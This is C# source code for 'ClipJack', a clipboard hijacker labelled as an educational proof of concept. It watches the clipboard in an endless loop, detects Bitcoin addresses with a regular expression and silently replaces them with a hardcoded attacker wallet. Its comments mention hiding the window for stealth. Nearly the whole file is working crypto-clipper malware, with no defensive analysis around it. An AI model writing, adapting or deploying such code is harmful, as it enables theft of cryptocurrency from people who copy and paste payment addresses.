using System;
using System.Windows.Forms;
using System.Threading;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;

namespace ClipJack
{
    class Program
    {
        // ClipJack - Clipboard Hijacker
        // Educational Proof-of-Concept
        
        [STAThread]
        static void Main(string[] args)
        {
            Console.WriteLine("[*] ClipJack Active - Monitoring Clipboard...");
            // Hide Window Logic would go here (Stealth)
            
            while (true)
            {
                try
                {
                    if (Clipboard.ContainsText())
                    {
                        string text = Clipboard.GetText();
                        
                        // Example: Bitcoin Address Pattern (simplified P2PKH)
                        // Starts with 1 or 3, length 26-35
                        if (Regex.IsMatch(text, "^[13][a-km-zA-Z1-9]{25,34}$"))
                        {
                            string myWallet = "1HackerWalletAddressToStealCoins";
                            if (text != myWallet)
                            {
                                Console.WriteLine($"[+] Crypto Address Detected: {text}");
                                Console.WriteLine($"[!] Swapping with: {myWallet}");
                                Clipboard.SetText(myWallet);
                            }
                        }
                    }
                }
                catch 
                {
                   // Clipboard access denied or busy, ignore
                }
                Thread.Sleep(500);
            }
        }
    }
}
